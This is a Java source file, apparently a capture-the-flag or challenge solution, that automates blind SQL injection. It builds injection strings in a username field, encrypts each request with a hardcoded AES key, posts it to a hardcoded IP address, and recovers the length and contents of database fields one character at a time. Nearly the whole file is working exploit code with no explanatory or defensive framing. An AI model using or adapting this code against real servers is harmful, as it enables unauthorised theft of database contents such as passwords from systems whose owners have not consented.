package main;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import java.io.IOException;
import java.security.SecureRandom;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

public class Functions {
	public static boolean checkError(JSONObject jsonReceived) throws Exception {
		if((jsonReceived.getString("error")) == "Unknown") {
			return true;
		}else {
			return false;
		}
	}
	
	public static String getLength(String sqlQuery) throws Exception {
		String lengthCountString = "";
		String sqliString = "";
		String sqli = "";
		int sqliCount = 0;
		
		while (lengthCountString == "") {	
			//build the injection string
			sqliString = Integer.toString(sqliCount);
			sqli = sqlQuery+sqliString+";--";
			//build payload
			JSONObject plainJSON = Functions.buildJSON(sqli, "password", "getTemp", 88);
			//encrypt payload
			String encJSON = Functions.Encrypt(plainJSON);
			//send and receive
			JSONObject jsonResponse = Functions.apacheClient(encJSON);
			if((jsonResponse.getBoolean("success")) == true) {
				lengthCountString = Integer.toString(sqliCount);
				return sqliString;
			}
			sqliCount++;
		}
		return null;
	}
	
	public static String getField(String sqlQuery, int valueLength) throws Exception {
		char[] characterSet = "0123456789.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$&*()-=+{}\\|;:,<>/?`~".toCharArray();
		String sqliString = "";
		String valueReturn = "";
		String sqli = "";
		
		while (valueLength > 1) {
			fieldWhile:
			for (char character : characterSet) {
				//build the injection string
				sqliString = String.valueOf(character);
				sqli = sqlQuery+valueReturn+sqliString+"%';--";
				//build payload
				JSONObject plainJSON = Functions.buildJSON(sqli, "password", "getTemp", 88);
				//encrypt payload
				String encJSON = Functions.Encrypt(plainJSON);
				//send and receive				
				JSONObject jsonResponse = Functions.apacheClient(encJSON);
				if((jsonResponse.getBoolean("success")) == true) {
					valueLength--;
					valueReturn = valueReturn + sqliString;
					break fieldWhile;
				}
			}
		}
		for (char character : characterSet) {
			//build the injection string
			sqliString = String.valueOf(character);
			sqli = sqlQuery+valueReturn+sqliString+"%';--";
			//build payload
			JSONObject plainJSON = Functions.buildJSON(sqli, "password", "getTemp", 88);
			//encrypt payload
			String encJSON = Functions.Encrypt(plainJSON);
			//send and receive
			JSONObject jsonResponse = Functions.apacheClient(encJSON);
			if((jsonResponse.getBoolean("success")) == true) {
				valueLength--;
				valueReturn = valueReturn + sqliString;
				return valueReturn;
			}
		}
		return null;
	}
	
	public static JSONObject buildJSON(String username, String password, String cmd, int temp) {
		try {
			JSONObject jsonString = new JSONObject()
					.put("username", username)
					.put("password", password)
					.put("cmd", cmd)
					.put("temp", temp);
			return jsonString;
		}catch (JSONException e) {
			e.printStackTrace();
			return null;
		}
	}
	
	public static String Encrypt(JSONObject jsonString) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
        byte[] bArr = new byte[16];
        new SecureRandom().nextBytes(bArr);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
        instance.init(1, secretKeySpec, ivParameterSpec);
        byte[] doFinal = instance.doFinal(jsonString.toString().getBytes());
        byte[] bArr2 = new byte[(doFinal.length + 16)];
        System.arraycopy(bArr, 0, bArr2, 0, 16);
        System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);
        return Base64.getEncoder().encodeToString(bArr2);
	}
	
	public static JSONObject Decrypt(String encJSON) throws Exception {
		byte[] decode = Base64.getDecoder().decode(encJSON);
		byte[] bArr = new byte[16];
		System.arraycopy(decode, 0, bArr, 0, 16);
		byte[] bArr2 = new byte[(decode.length - 16)];
		System.arraycopy(decode, 16, bArr2, 0, decode.length - 16);
		SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
		IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
		Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
		instance.init(2, secretKeySpec, ivParameterSpec);
		JSONObject jSONObject = new JSONObject(new String(instance.doFinal(bArr2)));
		return jSONObject;
	}
	
	public static JSONObject apacheClient(String encryptedData) throws Exception {
	    CloseableHttpClient httpclient = HttpClients.createDefault();
	    
	    String sendString = encryptedData+"&";
	    HttpPost httppost = new HttpPost("http://35.243.186.41/");

	    List<NameValuePair> encPost = new ArrayList<NameValuePair>();
	    encPost.add(new BasicNameValuePair("d", sendString));
	    httppost.setEntity(new UrlEncodedFormEntity(encPost, "UTF-8"));

	    ResponseHandler<String> responseHandler = new ResponseHandler<String>() {

	    @Override
	    public String handleResponse(
	    		final HttpResponse response) throws ClientProtocolException, IOException {
	            int status = response.getStatusLine().getStatusCode();
	            if (status >= 200 && status < 300) {
	                HttpEntity entity = response.getEntity();
	                return entity != null ? EntityUtils.toString(entity) : null;
	            } else {
	                throw new ClientProtocolException("Unexpected response status: " + status);
	            }
	       }
	    };
	    String responseBody = httpclient.execute(httppost, responseHandler);
	    
	    JSONObject decryptedData = Functions.Decrypt(responseBody);
	    
	    httpclient.close();
	    return decryptedData;
	    }
}
